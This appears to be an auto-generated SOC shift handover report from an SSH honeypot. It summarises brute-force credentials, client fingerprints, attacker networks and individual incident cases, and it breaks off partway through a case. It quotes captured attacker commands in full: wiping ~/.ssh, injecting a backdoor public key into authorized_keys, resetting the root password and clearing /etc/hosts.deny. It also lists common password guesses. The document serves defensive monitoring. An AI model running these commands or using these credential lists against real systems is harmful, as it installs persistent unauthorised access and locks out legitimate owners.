# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-02 |
| **Generated At** | 2026-06-02T23:50:04Z |
| **Shift Time** | 23:50 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **703** |
| Confirmed Threats | **696** |
| False Positives Filtered | **7** (1.0%) |
| Unique Attacker IPs | **64** |
| Countries of Origin | **26** |
| High Severity Cases | **239** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **464** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **556** |
| Unique Credential Pairs | **299** |
| Unique Usernames | **170** |
| Unique Passwords | **250** |
| Successful Auth Pairs | **148** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 240 |
| `345gs5662d34` | 111 |
| `ubuntu` | 7 |
| `deploy` | 3 |
| `alex` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 117 |
| `345gs5662d34` | 111 |
| `123456` | 31 |
| `123` | 8 |
| `1234` | 7 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 117 |
| `345gs5662d34` | `345gs5662d34` | 111 |
| `root` | `User1234` | 2 |
| `plane` | `plane` | 2 |
| `andrey` | `andrey123` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `User1234` | `161.35.65.86` | 2026-06-02T20:53:37 |
| `root` | `3245gs5662d34` | `161.35.65.86` | 2026-06-02T20:53:41 |
| `root` | `123456788` | `50.116.72.139` | 2026-06-02T20:53:51 |
| `root` | `3245gs5662d34` | `50.116.72.139` | 2026-06-02T20:53:57 |
| `root` | `freedom` | `54.37.74.179` | 2026-06-02T20:54:02 |
| `root` | `3245gs5662d34` | `54.37.74.179` | 2026-06-02T20:54:06 |
| `root` | `rootuser` | `197.221.232.44` | 2026-06-02T20:54:50 |
| `root` | `3245gs5662d34` | `197.221.232.44` | 2026-06-02T20:54:57 |
| `root` | `amaterasu` | `104.208.108.166` | 2026-06-02T20:54:58 |
| `root` | `3245gs5662d34` | `104.208.108.166` | 2026-06-02T20:55:01 |
| `root` | `admin` | `192.42.116.17` | 2026-06-02T20:55:23 |
| `root` | `asdf1234@` | `42.200.66.164` | 2026-06-02T20:55:24 |
| `root` | `3245gs5662d34` | `42.200.66.164` | 2026-06-02T20:55:28 |
| `root` | `Password_2025` | `54.37.74.179` | 2026-06-02T20:55:42 |
| `root` | `qq1234567` | `161.35.65.86` | 2026-06-02T20:56:55 |
| `root` | `abcDEF123` | `54.37.74.179` | 2026-06-02T20:57:27 |
| `root` | `Sl123456@` | `50.116.72.139` | 2026-06-02T20:58:20 |
| `root` | `Microsoft123` | `161.35.65.86` | 2026-06-02T20:58:39 |
| `root` | `oracle2025` | `54.37.74.179` | 2026-06-02T20:59:17 |
| `root` | `Tb123456` | `61.76.136.25` | 2026-06-02T21:00:12 |
| `root` | `3245gs5662d34` | `61.76.136.25` | 2026-06-02T21:00:15 |
| `root` | `Huawei@12#$` | `182.253.156.184` | 2026-06-02T21:00:54 |
| `root` | `3245gs5662d34` | `182.253.156.184` | 2026-06-02T21:00:57 |
| `root` | `qq1234567` | `50.116.72.139` | 2026-06-02T21:01:17 |
| `root` | `User1234` | `50.116.72.139` | 2026-06-02T21:02:44 |
| `root` | `232323` | `182.253.156.184` | 2026-06-02T21:02:59 |
| `root` | `Microsoft123` | `50.116.72.139` | 2026-06-02T21:04:14 |
| `root` | `1QAZ2wsx3EDC` | `42.200.66.164` | 2026-06-02T21:04:39 |
| `root` | `testroot` | `104.208.108.166` | 2026-06-02T21:04:56 |
| `root` | `PMGS**56$wx*%*St` | `104.208.108.166` | 2026-06-02T21:06:59 |
| `root` | `Qwertyui` | `182.253.156.184` | 2026-06-02T21:07:12 |
| `root` | `12345678@Abc` | `50.116.72.139` | 2026-06-02T21:07:14 |
| `root` | `Qwe2025@` | `50.116.72.139` | 2026-06-02T21:08:45 |
| `root` | `work@123` | `104.208.108.166` | 2026-06-02T21:09:01 |
| `root` | `carlos` | `182.253.156.184` | 2026-06-02T21:09:10 |
| `root` | `12345678910` | `50.116.72.139` | 2026-06-02T21:10:17 |
| `root` | `22222222` | `104.208.108.166` | 2026-06-02T21:15:02 |
| `root` | `123asd` | `42.200.66.164` | 2026-06-02T21:15:54 |
| `root` | `1qaz.2wsx` | `118.186.18.243` | 2026-06-02T21:16:12 |
| `root` | `123qweasd!@#` | `203.83.234.180` | 2026-06-02T21:17:33 |
| `root` | `3245gs5662d34` | `203.83.234.180` | 2026-06-02T21:17:43 |
| `root` | `Xz@123456` | `42.200.66.164` | 2026-06-02T21:17:45 |
| `root` | `ag@123` | `197.221.232.44` | 2026-06-02T21:18:10 |
| `root` | `Qwer13579` | `118.186.18.243` | 2026-06-02T21:18:54 |
| `root` | `3245gs5662d34` | `118.186.18.243` | 2026-06-02T21:19:02 |
| `root` | `#EDCvfr4` | `42.200.66.164` | 2026-06-02T21:19:34 |
| `root` | `Root123!@#` | `182.253.156.184` | 2026-06-02T21:20:58 |
| `root` | `Dj123456` | `104.208.108.166` | 2026-06-02T21:21:01 |
| `root` | `Pambazuka08` | `42.200.66.164` | 2026-06-02T21:21:22 |
| `root` | `1QAZ2wsx3EDC` | `197.221.232.44` | 2026-06-02T21:22:52 |
| `root` | `123$qweR` | `104.208.108.166` | 2026-06-02T21:23:04 |
| `root` | `ag@123` | `42.200.66.164` | 2026-06-02T21:23:14 |
| `root` | `Tb123456` | `104.208.108.166` | 2026-06-02T21:25:09 |
| `root` | `123asd` | `197.221.232.44` | 2026-06-02T21:25:14 |
| `root` | `china@123` | `118.186.18.243` | 2026-06-02T21:25:14 |
| `root` | `root@0` | `104.208.108.166` | 2026-06-02T21:27:10 |
| `root` | `Vm@12345` | `182.253.156.184` | 2026-06-02T21:28:56 |
| `root` | `Asdf123$` | `118.186.18.243` | 2026-06-02T21:29:57 |
| `root` | `#EDCvfr4` | `197.221.232.44` | 2026-06-02T21:32:10 |
| `root` | `example` | `104.208.108.166` | 2026-06-02T21:33:15 |
| `root` | `1qaz!QAZ2wsx` | `197.221.232.44` | 2026-06-02T21:34:32 |
| `root` | `fuckyou` | `104.208.108.166` | 2026-06-02T21:35:18 |
| `root` | `rootroot` | `203.83.234.180` | 2026-06-02T21:35:40 |
| `root` | `Xz@123456` | `197.221.232.44` | 2026-06-02T21:36:54 |
| `root` | `12345678Ab` | `182.253.156.184` | 2026-06-02T21:38:59 |
| `root` | `Pambazuka08` | `197.221.232.44` | 2026-06-02T21:39:11 |
| `root` | `1234qwert` | `104.208.108.166` | 2026-06-02T21:41:18 |
| `root` | `Zt123123` | `182.253.156.184` | 2026-06-02T21:46:48 |
| `root` | `huawei@2026` | `182.253.156.184` | 2026-06-02T21:52:50 |
| `root` | `Admin12345.` | `182.253.156.184` | 2026-06-02T21:54:52 |
| `root` | `QWEqaz123` | `182.253.156.184` | 2026-06-02T21:56:53 |
| `root` | `zxczxczxc` | `118.35.127.66` | 2026-06-02T22:01:24 |
| `root` | `3245gs5662d34` | `118.35.127.66` | 2026-06-02T22:01:27 |
| `root` | `Server1234!` | `111.68.98.152` | 2026-06-02T22:09:31 |
| `root` | `3245gs5662d34` | `111.68.98.152` | 2026-06-02T22:09:35 |
| `root` | `Qwer123456!` | `87.106.29.151` | 2026-06-02T22:27:35 |
| `root` | `3245gs5662d34` | `87.106.29.151` | 2026-06-02T22:27:39 |
| `root` | `Admin123456#` | `86.98.113.226` | 2026-06-02T22:28:40 |
| `root` | `3245gs5662d34` | `86.98.113.226` | 2026-06-02T22:28:43 |
| `root` | `black@123` | `87.106.29.151` | 2026-06-02T22:30:51 |
| `root` | `!1qaz@2wsx` | `143.64.168.136` | 2026-06-02T22:31:06 |
| `root` | `check123` | `87.106.29.151` | 2026-06-02T22:35:40 |
| `root` | `roots` | `86.98.113.226` | 2026-06-02T22:35:43 |
| `root` | `!1qaz2wsx` | `87.106.29.151` | 2026-06-02T22:37:11 |
| `root` | `lolo` | `87.106.29.151` | 2026-06-02T22:40:25 |
| `root` | `Jkl123456` | `86.98.113.226` | 2026-06-02T22:42:33 |
| `root` | `Admin123456@` | `143.64.168.136` | 2026-06-02T22:43:39 |
| `root` | `/` | `87.106.29.151` | 2026-06-02T22:43:40 |
| `root` | `3245gs5662d34` | `143.64.168.136` | 2026-06-02T22:43:47 |
| `root` | `root@888` | `87.106.29.151` | 2026-06-02T22:45:23 |
| `root` | `786786` | `95.167.225.76` | 2026-06-02T22:45:44 |
| `root` | `3245gs5662d34` | `95.167.225.76` | 2026-06-02T22:45:48 |
| `root` | `Server@123` | `125.138.175.113` | 2026-06-02T22:47:14 |
| `root` | `3245gs5662d34` | `125.138.175.113` | 2026-06-02T22:47:18 |
| `root` | `Lv123456` | `95.167.225.76` | 2026-06-02T22:48:51 |
| `root` | `Asd@123` | `143.64.168.136` | 2026-06-02T22:48:58 |
| `root` | `Asd@123` | `87.106.29.151` | 2026-06-02T22:50:11 |
| `root` | `Kc@123456` | `86.98.113.226` | 2026-06-02T22:51:49 |
| `root` | `@WSXzaq1` | `95.167.225.76` | 2026-06-02T22:51:57 |
| `root` | `123qqq...` | `103.171.69.82` | 2026-06-02T22:52:47 |
| `root` | `3245gs5662d34` | `103.171.69.83` | 2026-06-02T22:52:49 |
| `root` | `P@ssW0rd2025` | `95.167.225.76` | 2026-06-02T22:53:33 |
| `root` | `qwertyuiop` | `103.171.69.82` | 2026-06-02T22:54:56 |
| `root` | `3245gs5662d34` | `103.171.69.66` | 2026-06-02T22:54:58 |
| `root` | `optimus1` | `87.106.29.151` | 2026-06-02T22:55:01 |
| `root` | `aa@123` | `95.167.225.76` | 2026-06-02T22:55:07 |
| `root` | `ls` | `103.171.69.82` | 2026-06-02T22:57:07 |
| `root` | `3245gs5662d34` | `103.171.69.82` | 2026-06-02T22:57:09 |
| `root` | `123qwerty` | `103.171.69.82` | 2026-06-02T22:59:24 |
| `root` | `3245gs5662d34` | `103.171.69.79` | 2026-06-02T22:59:26 |
| `root` | `123456Aa` | `95.167.225.76` | 2026-06-02T23:01:29 |
| `root` | `qwe12345.` | `95.167.225.76` | 2026-06-02T23:03:02 |
| `root` | `internet123` | `86.98.113.226` | 2026-06-02T23:03:20 |
| `root` | `1qaz@Wsx3edc` | `86.98.113.226` | 2026-06-02T23:05:41 |
| `root` | `Admin123456@` | `87.106.29.151` | 2026-06-02T23:06:28 |
| `root` | `Password2025` | `95.167.225.76` | 2026-06-02T23:07:49 |
| `root` | `Pass123456@` | `86.98.113.226` | 2026-06-02T23:08:02 |
| `root` | `Server@123` | `103.171.69.82` | 2026-06-02T23:08:13 |
| `root` | `3245gs5662d34` | `103.171.69.74` | 2026-06-02T23:08:15 |
| `root` | `!1qaz@2wsx` | `87.106.29.151` | 2026-06-02T23:09:36 |
| `root` | `Admin123123` | `86.98.113.226` | 2026-06-02T23:12:39 |
| `root` | `A.123456` | `95.167.225.76` | 2026-06-02T23:14:10 |
| `root` | `145236` | `86.98.113.226` | 2026-06-02T23:14:58 |
| `root` | `654654654` | `103.171.69.82` | 2026-06-02T23:16:52 |
| `root` | `odoo1234` | `86.98.113.226` | 2026-06-02T23:17:13 |
| `root` | `passwd456` | `95.167.225.76` | 2026-06-02T23:18:56 |
| `root` | `ChangeMe123!` | `95.167.225.76` | 2026-06-02T23:20:32 |
| `root` | `12QWaszx` | `103.171.69.86` | 2026-06-02T23:21:16 |
| `root` | `zaq1@wsx` | `95.167.225.76` | 2026-06-02T23:23:38 |
| `root` | `1010` | `86.98.113.226` | 2026-06-02T23:24:16 |
| `root` | `root123@` | `103.171.69.82` | 2026-06-02T23:27:44 |
| `root` | `linux` | `95.167.225.76` | 2026-06-02T23:28:28 |
| `root` | `Testing@123` | `86.98.113.226` | 2026-06-02T23:28:48 |
| `root` | `QWEasdZXC` | `103.171.69.82` | 2026-06-02T23:30:09 |
| `root` | `3245gs5662d34` | `103.171.69.76` | 2026-06-02T23:30:11 |
| `root` | `unlock` | `103.171.69.82` | 2026-06-02T23:32:23 |
| `root` | `sunnada` | `103.171.69.82` | 2026-06-02T23:34:31 |
| `root` | `abc@12345` | `14.103.115.25` | 2026-06-02T23:35:40 |
| `root` | `tencent@123` | `194.163.172.121` | 2026-06-02T23:35:46 |
| `root` | `3245gs5662d34` | `194.163.172.121` | 2026-06-02T23:35:50 |
| `root` | `a1a2a3a4` | `194.163.172.121` | 2026-06-02T23:38:26 |
| `root` | `12345@Abc` | `103.171.69.82` | 2026-06-02T23:38:58 |
| `root` | `3245gs5662d34` | `103.171.69.93` | 2026-06-02T23:39:00 |
| `root` | `Gc123456` | `194.163.172.121` | 2026-06-02T23:40:52 |
| `root` | `Changeme1` | `81.193.216.17` | 2026-06-02T23:43:05 |
| `root` | `3245gs5662d34` | `81.193.216.17` | 2026-06-02T23:43:12 |
| `root` | `@huawei123` | `194.163.172.121` | 2026-06-02T23:47:14 |
| `root` | `zxcZXC123!@#` | `81.193.216.17` | 2026-06-02T23:47:43 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **703** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 665 |
| OpenSSH | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 534 | 35 |
| `03a80b21afa8...` | Modern SSH client | 112 | 8 |
| `af8223ac9914...` | libssh-based | 3 | 1 |
| `1cc79c7da9b5...` | libssh-based | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 534 | 35 | Mirai/variant |
| `03a80b21afa8...` | libssh | 112 | 8 | Modern SSH client |
| `95420f9d932d...` | libssh | 15 | 3 | — |
| `af8223ac9914...` | libssh | 3 | 1 | libssh-based |
| `1cc79c7da9b5...` | OpenSSH | 1 | 1 | libssh-based |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1082, T1592` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 117 | 21 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:6XXInunXtXmH"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.115.25`, `143.64.168.136`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:0lqylhy7p5qh"|chpasswd|bash
```
Source IPs: `118.186.18.243`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `203.83.234.180`, `54.37.74.179`, `61.76.136.25`, `125.138.175.113`, `50.116.72.139`, `118.35.127.66`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **64** |
| Unique ASNs | **41** |
| High-Risk ASNs | **37** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS142627` | Multilink International | 11 | HIGH |
| `AS4811` | China Telecom (Group) | 5 | HIGH |
| `AS4766` | Korea Telecom | 3 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS5384` | Emirates Internet | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (239)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-9619f5702423

| Field | Detail |
|---|---|
| **Source IP** | `161.35.65[.]86` |
| **First Seen** | 2026-06-02 20:53 |
| **Last Seen** | 2026-06-02 20:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:53:37` | `cowrie.session.connect` |
| `2026-06-02 20:53:37` | `cowrie.client.version` |
| `2026-06-02 20:53:37` | `cowrie.client.kex` |
| `2026-06-02 20:53:37` | `cowrie.login.success` |
| `2026-06-02 20:53:38` | `cowrie.session.params` |
| `2026-06-02 20:53:38` | `cowrie.command.input` |
| `2026-06-02 20:53:38` | `cowrie.command.failed` |
| `2026-06-02 20:53:38` | `cowrie.log.closed` |
| `2026-06-02 20:53:38` | `cowrie.session.params` |
| `2026-06-02 20:53:38` | `cowrie.command.input` |
| `2026-06-02 20:53:38` | `cowrie.session.file_download` |
| `2026-06-02 20:53:38` | `cowrie.log.closed` |
| `2026-06-02 20:53:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.65[.]86` to AbuseIPDB if not already reported
- [ ] Block `161.35.65[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23a5f93e2c0e

| Field | Detail |
|---|---|
| **Source IP** | `161.35.65[.]86` |
| **First Seen** | 2026-06-02 20:53 |
| **Last Seen** | 2026-06-02 20:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:53:40` | `cowrie.session.connect` |
| `2026-06-02 20:53:40` | `cowrie.client.version` |
| `2026-06-02 20:53:40` | `cowrie.client.kex` |
| `2026-06-02 20:53:41` | `cowrie.login.success` |
| `2026-06-02 20:53:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.65[.]86` to AbuseIPDB if not already reported
- [ ] Block `161.35.65[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d20206944e7c

| Field | Detail |
|---|---|
| **Source IP** | `50.116.72[.]139` |
| **First Seen** | 2026-06-02 20:53 |
| **Last Seen** | 2026-06-02 20:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:53:50` | `cowrie.session.connect` |
| `2026-06-02 20:53:50` | `cowrie.client.version` |
| `2026-06-02 20:53:50` | `cowrie.client.kex` |
| `2026-06-02 20:53:51` | `cowrie.login.success` |
| `2026-06-02 20:53:51` | `cowrie.session.params` |
| `2026-06-02 20:53:51` | `cowrie.command.input` |
| `2026-06-02 20:53:51` | `cowrie.command.failed` |
| `2026-06-02 20:53:52` | `cowrie.log.closed` |
| `2026-06-02 20:53:52` | `cowrie.session.params` |
| `2026-06-02 20:53:52` | `cowrie.command.input` |
| `2026-06-02 20:53:52` | `cowrie.session.file_download` |
| `2026-06-02 20:53:52` | `cowrie.log.closed` |
| `2026-06-02 20:53:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.116.72[.]139` to AbuseIPDB if not already reported
- [ ] Block `50.116.72[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a971c301fa46

| Field | Detail |
|---|---|
| **Source IP** | `50.116.72[.]139` |
| **First Seen** | 2026-06-02 20:53 |
| **Last Seen** | 2026-06-02 20:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:53:55` | `cowrie.session.connect` |
| `2026-06-02 20:53:55` | `cowrie.client.version` |
| `2026-06-02 20:53:56` | `cowrie.client.kex` |
| `2026-06-02 20:53:57` | `cowrie.login.success` |
| `2026-06-02 20:53:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.116.72[.]139` to AbuseIPDB if not already reported
- [ ] Block `50.116.72[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d91fddb7f7d9

| Field | Detail |
|---|---|
| **Source IP** | `54.37.74[.]179` |
| **First Seen** | 2026-06-02 20:54 |
| **Last Seen** | 2026-06-02 20:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:54:02` | `cowrie.session.connect` |
| `2026-06-02 20:54:02` | `cowrie.client.version` |
| `2026-06-02 20:54:02` | `cowrie.client.kex` |
| `2026-06-02 20:54:02` | `cowrie.login.success` |
| `2026-06-02 20:54:03` | `cowrie.session.params` |
| `2026-06-02 20:54:03` | `cowrie.command.input` |
| `2026-06-02 20:54:03` | `cowrie.command.failed` |
| `2026-06-02 20:54:03` | `cowrie.log.closed` |
| `2026-06-02 20:54:03` | `cowrie.session.params` |
| `2026-06-02 20:54:03` | `cowrie.command.input` |
| `2026-06-02 20:54:03` | `cowrie.session.file_download` |
| `2026-06-02 20:54:03` | `cowrie.log.closed` |
| `2026-06-02 20:54:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.74[.]179` to AbuseIPDB if not already reported
- [ ] Block `54.37.74[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c276783c0851

| Field | Detail |
|---|---|
| **Source IP** | `54.37.74[.]179` |
| **First Seen** | 2026-06-02 20:54 |
